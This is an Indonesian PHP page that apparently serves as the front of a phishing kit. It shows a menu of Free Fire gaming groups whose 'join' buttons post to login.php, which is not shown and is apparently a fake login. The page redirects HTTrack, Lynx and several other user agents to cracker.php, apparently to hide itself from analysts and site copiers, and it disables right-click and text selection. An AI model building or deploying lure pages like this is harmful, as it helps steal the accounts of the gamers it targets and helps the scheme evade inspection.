<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENGAMBIL KONTROL
include("setting.php");
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<div class="container">

<img class="icon" src="ikhbaljb/icon.png">
<center>
<div class="divider">
<span>Bergabung dan Ikut Bermain Bersama Pro Player</span>
</div>
<div class="notify">
Pilih grup
</div>

<div class="scroll">
<div class="item">
<form action="login.php" method="post">
<input type="hidden" name="link_grup" value="Link Situs" readonly>
<button type="submit">Gabung</button>
</form>
<img src="ikhbaljb/frontal.png">
<div class="nama-grup">FRONTAL GAMING</div>
<div class="deskripsi-grup"></div>
</div>
<div class="item">
<form action="login.php" method="post">
<input type="hidden" name="link_grup" value="Link Situs" readonly>
<button type="submit">Gabung</button>
</form>
<img src="ikhbaljb/budi01.png">
<div class="nama-grup">BUDI UWOE</div>
<div class="deskripsi-grup"></div>
</div>
<div class="item">
<form action="login.php" method="post">
<input type="hidden" name="link_grup" value="https://www.faa-site.tk/2020/04/lanjutkan-ke-xxi-film.html?m=1" readonly>
<button type="submit">Gabung</button>
</form>
<img src="ikhbaljb/fdw.png">
<div class="nama-grup">FDW BAR²</div>
<div class="deskripsi-grup"></div>
</div>
<div class="item">
<form action="login.php" method="post">
<input type="hidden" name="link_grup" value="https://www.faa-site.tk/2020/04/lanjutkan-ke-xxi-film.html?m=1" readonly>
<button type="submit">Gabung</button>
</form>
<img src="ikhbaljb/kemas.png">
<div class="nama-grup">KEMAS PAKE Z</div>
<div class="deskripsi-grup"></div>
</div>
<div class="item">
<form action="login.php" method="post">
<input type="hidden" name="link_grup" value="https://www.faa-site.tk/2020/04/lanjutkan-ke-xxi-film.html?m=1" readonly>
<button type="submit">Gabung</button>
</form>
<img src="ikhbaljb/kulgar.png">
<div class="nama-grup">EVENT KULGAR</div>
<div class="deskripsi-grup"></div>
</div>
<div class="item">
<form action="login.php" method="post">
<input type="hidden" name="link_grup" value="https://www.faa-site.tk/2020/04/lanjutkan-ke-xxi-film.html?m=1" readonly>
<button type="submit">Gabung</button>
</form>
<img src="ikhbaljb/turney.png">
<div class="nama-grup">INFO TURNEY FREE FIRE/div>
<div class="deskripsi-grup"></div>
</div>
</div>
</center>

<div class="line"></div>

<div class="footer">
Copyright <?php echo date("Y");?>
</div>

</div> <!--- container --->


</body>
</html>